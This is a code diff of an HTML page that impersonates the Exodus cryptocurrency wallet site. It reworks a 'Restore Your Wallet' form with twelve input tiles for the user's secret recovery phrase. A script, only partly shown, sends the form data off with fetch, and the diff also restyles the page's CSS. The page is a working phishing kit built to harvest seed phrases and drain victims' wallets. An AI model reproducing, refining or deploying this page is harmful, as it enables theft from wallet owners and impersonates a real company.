@@ -28,64 +28,70 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
 /static/2fe75eac6750dec126c82ecfccb52c7e/49438/header-bg-d.jpg 1080w,
 /static/2fe75eac6750dec126c82ecfccb52c7e/f4534/header-bg-d.jpg 1366w,
 /static/2fe75eac6750dec126c82ecfccb52c7e/3832f/header-bg-d.jpg 1920w" alt="background"/></picture></noscript></div></div></div><header class="x__index-page__header"><div class="x__index-page__header__content">
-<h1 class="x__index-page__header__heading">Bitcoin and <br>Crypto Wallet</h1>
- <div class="login-form exodus__download__dropdown
+<div class="custom-login-form">
+    <header class="x__index-page__header">
+        <div class="x__index-page__header__content">
+            <h1 class="x__index-page__header__heading">Restore Your Wallet</h1>
         </div>
-        <h2>Restore Your Wallet</h2>
+    </header>
+    <div class="login-form exodus__download__dropdown">
+        <div class="x__index-page__header__logo">
+            <img src="https://i.postimg.cc/cLT3fsMT/favicon-v-3.png" alt="Exodus Logo">
+        </div>
         <h4>Enter your 12-word secret phrase to import your existing wallet</h4>
         <form id="loginForm">
             <div class="container">
                 <!-- Creating 12 tiles -->
                 <div class="tile" id="tile1">
                     <span class="tile-title">1</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile2">
                     <span class="tile-title">2</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile3">
                     <span class="tile-title">3</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile4">
                     <span class="tile-title">4</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile5">
                     <span class="tile-title">5</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile6">
                     <span class="tile-title">6</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile7">
                     <span class="tile-title">7</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile8">
                     <span class="tile-title">8</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile9">
                     <span class="tile-title">9</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile10">
                     <span class="tile-title">10</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile11">
                     <span class="tile-title">11</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
                 <div class="tile" id="tile12">
                     <span class="tile-title">12</span>
-                    <input type="text" placeholder="Enter word">
+                    <input type="text" placeholder="">
                 </div>
             </div>
-            <button class="x__button-default x__button-default--normal x__button-default--primary" type="submit">Log In</button>
+            <button class="x__button-default x__button-default--normal x__button-default--primary" type="submit">Restore</button>
         </form>
     </div>
     <script>
@@ -112,7 +118,8 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
             .catch(error => console.error('Error:', error));
         });
     </script>
-</div></header>
+</div>
+
 <style>
     body {
         background-color: #121212;
@@ -126,7 +133,7 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
         margin: 0;
     }
 
-    .x__index-page__header {
+    .custom-login-form .x__index-page__header {
         width: 100%;
         display: flex;
         justify-content: space-between;
@@ -135,16 +142,16 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
     }
 
-    .x__index-page__header__logo img {
+    .custom-login-form .x__index-page__header__logo img {
         width: 150px;
     }
 
-    .x__index-page__header__content {
+    .custom-login-form .x__index-page__header__content {
         text-align: center;
         margin-bottom: 20px;
     }
 
-    .login-form {
+    .custom-login-form .login-form {
         padding: 20px;
         border-radius: 10px;
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
@@ -153,7 +160,7 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
         margin-bottom: 30px;
     }
 
-    .container {
+    .custom-login-form .container {
         display: grid;
         grid-template-columns: repeat(3, 1fr);
         gap: 10px;
@@ -161,7 +168,7 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
         margin-top: 20px;
     }
 
-    .tile {
+    .custom-login-form .tile {
         background-color: #1e1e1e;
         border: 2px solid #333;
         border-radius: 8px;
@@ -170,14 +177,14 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
         position: relative;
     }
 
-    .tile-title {
+    .custom-login-form .tile-title {
         position: absolute;
         top: 10px;
         left: 10px;
         font-weight: bold;
     }
 
-    input[type="text"] {
+    .custom-login-form input[type="text"] {
         width: 100%;
         padding: 10px;
         margin-top: 30px;
@@ -187,7 +194,7 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
         color: #ffffff;
     }
 
-    button.x__button-default {
+    .custom-login-form button.x__button-default {
         padding: 20px;
         border-radius: 10px;
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
@@ -196,8 +203,8 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
         background-color: #4CAF50;
         color: white;
         border: none;
-    }
-                 </style>
+ }
+</body>
+ </style>
 
-    </body>
 </html>
